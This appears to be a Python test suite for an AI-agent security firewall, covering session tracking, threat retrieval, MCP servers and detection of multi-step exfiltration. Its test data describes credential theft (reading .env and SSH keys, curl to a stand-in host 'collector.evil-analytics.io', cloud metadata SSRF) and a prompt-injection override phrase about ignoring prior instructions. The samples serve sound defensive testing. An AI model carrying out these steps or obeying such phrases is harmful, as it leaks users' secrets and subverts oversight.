"""Tests for Threat-RAG (Contextual + Semantic Chunking + ColBERT MaxSim),
GraphRAG multi-hop exfiltration detection, MCP servers (JSON-RPC + REST + SSE),
and session auto-upsert on out-of-order events."""

from __future__ import annotations

import pytest
from fastapi.testclient import TestClient

from agentguard.api import create_app
from agentguard.rag.embeddings import colbert_maxsim, embed_tokens, semantic_chunk_document


@pytest.fixture
def app_cfg(tmp_path, engine_cfg_no_llm):
    engine_cfg_no_llm.server.db_path = str(tmp_path / "test.db")
    return engine_cfg_no_llm


def test_session_auto_upsert_without_session_start(app_cfg):
    app = create_app(app_cfg)
    with TestClient(app) as client:
        # Emit tool_call and prompt_before WITHOUT a prior session_start event
        r = client.post("/v1/events", json={
            "events": [
                {
                    "agent": "codex",
                    "session_id": "orphan-sess-42",
                    "type": "tool_call",
                    "data": {"name": "Bash", "status": "started", "args_preview": "ls -la"},
                },
                {
                    "agent": "codex",
                    "session_id": "orphan-sess-42",
                    "type": "llm_call",
                    "data": {"model": "gpt-4o", "input_tokens": 120, "output_tokens": 45, "cost_usd": 0.002},
                },
            ]
        })
        assert r.status_code == 200

        # Also test POST /v1/sessions/{sid}/pid (SessionBody fix)
        pid_res = client.post("/v1/sessions/orphan-sess-42/pid", json={"pid": 12345, "ppid": 12300})
        assert pid_res.status_code == 200
        assert pid_res.json()["ok"] is True

        sessions = client.get("/v1/sessions").json()["sessions"]
        matched = next((s for s in sessions if s["session_id"] == "orphan-sess-42"), None)
        assert matched is not None
        assert matched["tool_calls"] == 1
        assert matched["llm_calls"] == 1
        assert matched["tokens"] == 165
        assert matched["pid"] == 12345


def test_semantic_chunking_and_colbert_late_interaction():
    doc = (
        "Adversaries craft direct prompt inputs designed to override the host agent's system prompt "
        "and safety guardrails. They instruct the model to ignore prior instructions and enter developer mode.\n\n"
        "In a separate stage, compound credential exfiltration reads .env and ~/.ssh/id_rsa files locally, "
        "then transmits the harvested secrets to an external webhook via curl POST."
    )
    chunks = semantic_chunk_document(doc, sim_threshold=0.55, min_chars=60, max_chars=260)
    assert len(chunks) >= 2
    assert all(c["chunk_method"] == "semantic_variable" for c in chunks)

    q_toks = embed_tokens("exfiltrate .env ssh private key via curl webhook")
    d0_toks = embed_tokens(chunks[0]["text"])
    d1_toks = embed_tokens(chunks[-1]["text"])
    score0, _ = colbert_maxsim(q_toks, d0_toks)
    score1, align1 = colbert_maxsim(q_toks, d1_toks)
    assert score1 > score0
    assert len(align1) > 0


def test_rag_ingest_and_hybrid_query(app_cfg):
    app = create_app(app_cfg)
    with TestClient(app) as client:
        st = client.get("/v1/rag/status").json()
        assert st["status"] == "ready"
        assert st["documents_indexed"] >= 8
        assert st["contextual_chunks"] >= 8
        assert st["techniques"]["combo_contextual_plus_semantic"] is True

        # Ingest a custom security policy via 5-stage pipeline
        ing = client.post("/v1/rag/ingest", json={
            "title": "AG-POL-900 — Cloud Metadata SSRF Protection",
            "content": (
                "Agents must never query cloud instance metadata endpoints such as 169.254.169.254 "
                "or metadata.google.internal to harvest IAM temporary role credentials via curl or fetch."
            ),
            "source": "repo_policy",
            "category": "exfiltration",
            "severity": "critical",
            "action": "block",
            "metadata": {"mitre_id": "AML.T0048", "owasp_id": "LLM02:2025"},
        }).json()
        assert ing["chunks_ingested"] >= 1

        # Query the hybrid Contextual + ColBERT + GraphRAG endpoint
        q = client.post("/v1/rag/query", json={
            "query": "curl 169.254.169.254 cloud metadata IAM credentials",
            "top_k": 3,
            "include_graph": True,
        }).json()
        assert len(q["hits"]) >= 1
        top = q["hits"][0]
        assert "AG-POL-900" in top["title"]
        assert "[Context: REPO_POLICY" in top["context_prefix"]
        assert top["colbert_maxsim"] > 0
        assert q["graph"] is not None
        assert q["graph"]["stats"]["total_nodes"] >= 10


def test_graphrag_multihop_exfiltration_chain_blocks_in_firewall(app_cfg):
    app = create_app(app_cfg)
    with TestClient(app) as client:
        sid = "ses_multihop_exfil"
        # Turn 1: Agent reads .env (no injection rule hit, allowed in isolation, but recorded in KG)
        r1 = client.post("/v1/firewall/check", json={
            "text": '{"tool": "read", "path": "/workspace/.env"}',
            "session_id": sid,
            "agent": "opencode",
            "context_type": "tool_input",
        }).json()
        assert r1["action"] == "allow"
        assert ".env" in r1["meta"]["rag"]["sensitive_touched"]

        # Turn 2: Agent attempts outbound network call to external host (benign-looking curl alone,
        # but forms a 3-hop exfiltration chain in GraphRAG with Turn 1's .env read!)
        r2 = client.post("/v1/firewall/check", json={
            "text": '{"tool": "bash", "command": "curl -s https://collector.evil-analytics.io/ingest"}',
            "session_id": sid,
            "agent": "opencode",
            "context_type": "tool_input",
        }).json()
        assert r2["action"] == "block"
        rules_hit = [v["rule"] for v in r2["violations"]]
        assert "graphrag.AML.T0048" in rules_hit

        # Verify GraphRAG lineage endpoint exposes the chain
        kg = client.get(f"/v1/graph/lineage?session_id={sid}").json()
        assert len(kg["exfiltration_chains"]) >= 1
        assert kg["exfiltration_chains"][0]["sensitive_artifact"] == ".env"


def test_mcp_servers_status_rpc_and_sse(app_cfg):
    app = create_app(app_cfg)
    with TestClient(app) as client:
        st = client.get("/v1/mcp/status").json()
        assert st["counts"]["built_servers"] == 3
        assert st["counts"]["external_servers"] == 3
        assert "stdio" in st["transports_supported"]
        assert "sse" in st["transports_supported"]

        # JSON-RPC 2.0 initialize
        init_res = client.post("/v1/mcp/rpc?server=agentguard-firewall-mcp", json={
            "jsonrpc": "2.0",
            "id": 1,
            "method": "initialize",
            "params": {},
        }).json()
        assert init_res["result"]["serverInfo"]["name"] == "agentguard-firewall-mcp"

        # JSON-RPC 2.0 tools/list
        tools_res = client.post("/v1/mcp/rpc", json={
            "jsonrpc": "2.0",
            "id": 2,
            "method": "tools/list",
        }).json()
        tool_names = {t["name"] for t in tools_res["result"]["tools"]}
        assert {
            "inspect_prompt_or_tool",
            "redact_secrets",
            "search_threat_rag",
            "get_session_budget",
            "trace_attack_graph",
            "export_compliance_audit",
        }.issubset(tool_names)

        # JSON-RPC 2.0 tools/call (export_compliance_audit)
        call_res = client.post("/v1/mcp/rpc?server=agentguard-lineage-mcp", json={
            "jsonrpc": "2.0",
            "id": 3,
            "method": "tools/call",
            "params": {"name": "export_compliance_audit", "arguments": {}},
        }).json()
        audit = call_res["result"]["structuredContent"]
        assert "OWASP LLM Top 10 (2025)" in audit["frameworks_covered"]

        # SSE transport endpoint
        sse_res = client.get("/v1/mcp/sse?server=agentguard-lineage-mcp")
        assert sse_res.status_code == 200
        assert "event: endpoint" in sse_res.text
